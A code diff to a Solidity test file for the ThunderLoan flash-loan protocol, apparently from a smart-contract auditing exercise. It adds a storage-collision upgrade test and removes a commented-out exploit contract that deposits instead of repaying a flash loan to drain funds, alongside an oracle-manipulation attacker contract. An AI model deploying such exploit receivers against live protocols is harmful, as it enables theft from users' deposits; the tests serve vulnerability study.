@@ -14,6 +14,7 @@ import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
 import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
 import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
 import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -178,8 +179,9 @@ contract ThunderLoanTest is BaseTest {
         console.log("Normal fee is: ", normalFee); // 296147410319118389 In 2 steps, we will borrow the whole 100e18
         uint256 amountToBorrow = 40e18; // then we are gonna borrow the remaining 60e18 in the 2nd loan
 
-        MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees mFLR =
-        new MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees (tSwapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)), address(weth));
+        MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees mFLR = new MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees(
+            tSwapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)), address(weth)
+        );
         console.log("balance_0: ", tokenA.balanceOf(address(mFLR)));
 
         vm.startPrank(user);
@@ -214,59 +216,6 @@ contract ThunderLoanTest is BaseTest {
         if (remainder == 0) return number;
         return number + increment - remainder;
     }
-
-    /**
-     * This is my solution, which utiliizes 2 flash loans.
-     *
-     * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan
-     * has
-     * been corrected,
-     * i.e. when the following lines are commented out:
-     *         // uint256 calculatedFee = getCalculatedFee(token, amount);
-     *         // assetToken.updateExchangeRate(calculatedFee);
-     */
-    /*function test_useDepositInsteadOfRepay() public setAllowedToken hasDeposits {
-        // @note tokenA is the underlying token, it is allowed via modifier, ThunderLoan is funded via modifier
-        // @note MockTSwapPool does not need funding its function getPriceOfOnePoolTokenInWeth() always returns 1e18
-
-        uint256 amountToBorrow = AMOUNT * 10; // 100e18
-        uint256 amountForFees = 10e18;
-        uint256 initialAssetBalance;
-        uint256 endingAssetBalance;
-        uint256 initialUnderlyingBalance;
-        uint256 endingUnderlyingBalance;
-
-        // deploy the malicious flash loan receiver
-        MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds mFLR =
-    new MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds(address(thunderLoan),
-    address(thunderLoan.getAssetFromToken(tokenA)));
-        // give funds to the contract
-        console.log("balance_0: %e ", tokenA.balanceOf(address(mFLR)));
-        tokenA.mint(address(mFLR), amountForFees);
-        initialAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(mFLR));
-        initialUnderlyingBalance = tokenA.balanceOf(address(mFLR));
-        console.log("balance_1: %e ", tokenA.balanceOf(address(mFLR)));
-
-        vm.startPrank(user);
-        // flash loan request for 100e18 tokanA which we will deposit and not repay
-        thunderLoan.flashloan(address(mFLR), tokenA, amountToBorrow, "");
-        vm.stopPrank();
-
-        endingAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(mFLR));
-        endingUnderlyingBalance = tokenA.balanceOf(address(mFLR));
-
-        console.log("Initial asset balance: %e ", initialAssetBalance);
-        console.log("Ending asset balance: %e ", endingAssetBalance);
-        console.log("Initial underlying balance: %e ", initialUnderlyingBalance);
-        console.log("Ending underlying balance: %e ", endingUnderlyingBalance);
-
-        vm.prank(address(mFLR));
-        thunderLoan.redeem(tokenA, endingAssetBalance);
-
-        endingUnderlyingBalance = tokenA.balanceOf(address(mFLR));
-        console.log("-----Initial underlying balance: %e ", initialUnderlyingBalance);
-        console.log("-----Final underlying balance: %e ", endingUnderlyingBalance);
-    }*/
 
     function test_useDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
         // @note tokenA is the underlying token, it is allowed via modifier, ThunderLoan is funded via modifier
@@ -315,6 +264,20 @@ contract ThunderLoanTest is BaseTest {
         // If that part is corrected, however, than the LHS is slighly less than the RHS.
         assertGt(endingUnderlyingBalance, amountToBorrow + amountForFees);
     }
+
+    function test_upgradeBreaksStorage() public {
+        uint256 feeBeforeUpgrade = thunderLoan.getFee();
+        vm.startPrank(thunderLoan.owner());
+        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded(); // deploy the new implementation contract
+        thunderLoan.upgradeToAndCall(address(upgraded), "");
+        uint256 feeAfterUpgrade = thunderLoan.getFee();
+        vm.stopPrank();
+
+        console.log("Fee before upgrade: ", feeBeforeUpgrade);
+        console.log("Fee after upgrade: ", feeAfterUpgrade);
+
+        assert(feeBeforeUpgrade != feeAfterUpgrade);
+    }
 }
 
 contract MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees is IFlashLoanReceiver {
@@ -346,7 +309,7 @@ contract MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees is IFlashL
      * ---- the 2nd invocation (i.e. the else branch) finishes first, and then execution of the 1st invocation (if)
      * resumes
      * 3. swaps wethBought amount of WETH back to token
-     * 4. rapays secondLoanAmount with fees
+     * 4. repays secondLoanAmount with fees
      * 5. repays firstLoanAmount with fees
      *
      * @notice step 4 and 5 cannot be joined: we cannot pay back the 2 flashloans all at once at the end of the if()
@@ -406,7 +369,7 @@ contract MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees is IFlashL
             // repay 1: this does not work due to an issue with the contract:
             // you cannot user repay to repay a flash loan inside a flash loan
             /* IERC20(token).approve(address(tSwapPool), amount + fee);
-            thunderLoan.repay(IERC20(token), amount + fee); // repay 1    // q cant we repay all at once? */
+            thunderLoan.repay(IERC20(token), amount + fee); // repay 1    // q cant we repay all at once? No! */
             // instead:
             IERC20(token).transfer(repayAddress, firstLoanAmount + fee);
             console.log("balance_5: ", IERC20(token).balanceOf(address(this)));
@@ -427,86 +390,6 @@ contract MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees is IFlashL
     }
 }
 
-/**
- * This is my solution, which utiliizes 2 flash loans.
- *
- * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan has
- * been corrected,
- * i.e. when the following lines are commented out:
- *         // uint256 calculatedFee = getCalculatedFee(token, amount);
- *         // assetToken.updateExchangeRate(calculatedFee);
- */
-/*contract MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds is IFlashLoanReceiver {
-    ThunderLoan thunderLoan;
-    bool attacked = false;
-    address repayAddress;
-
-    constructor(address _thunderLoan, address _repayAddress) {
-        thunderLoan = ThunderLoan(_thunderLoan);
-        repayAddress = _repayAddress;
-    }
-
-    /**
-     * Output:
-     * Logs:
-     *   balance_0: 0e0
-     *   balance_1: 1e19
-     *   balance_2: 1.1e20
-     *   balance_5: 1.097e20
-     *   balance_3: 1.097e20
-     *   needed: 1e20
-     *   balance_4: 2.09760009e20
-     *   balance_5: 9.160009e18
-     *   Initial asset balance: 0e0
-     *   Ending asset balance: 1.00479694140343321376e20
-     *   Initial underlying balance: 1e19
-     *   Ending underlying balance: 9.160009e18
-     *   -----Initial underlying balance: 1e19
-     *   -----Final underlying balance: 1.09699999999999999999e20
-     */
-
-/*   function executeOperation(
-        address token,
-        uint256 amount,
-        uint256 fee,
-        address, /*initiator*/
-/*      bytes calldata /*params*/
-/* )
-        external
-        returns (bool)
-    {
-        if (!attacked) {
-            attacked = true;
-            // 2nd flash loan, same amount
-            console.log("balance_2: %e ", IERC20(token).balanceOf(address(this)));
-            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
-            console.log("balance_3: %e ", IERC20(token).balanceOf(address(this)));
-            console.log("needed: %e ", amount);
-
-            // after the else() branch is executed, execution resumes here
-            // here the 2nd flash loan is deposited (the protocol thinks it is paid back), but the first deposit is
-            // still with us
-            thunderLoan.redeem(IERC20(token), amount);
-            console.log("balance_4: %e ", IERC20(token).balanceOf(address(this)));
-            IERC20(token).transfer(repayAddress, amount + fee);
-        } else { }
-        // approve spending
-        IERC20(token).approve(address(thunderLoan), amount + fee);
-        // deposit instead of repay
-        thunderLoan.deposit(IERC20(token), amount + fee);
-        console.log("balance_5: %e ", IERC20(token).balanceOf(address(this)));
-
-        return true;
-    }
-}*/
-
-/**
- * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan has
- * been corrected,
- * i.e. when the following lines are commented out:
- *         // uint256 calculatedFee = getCalculatedFee(token, amount);
- *         // assetToken.updateExchangeRate(calculatedFee);
- */
 contract MaliciousFlashLoanReceiver_depositOverRepay is IFlashLoanReceiver {
     ThunderLoan thunderLoan;
 
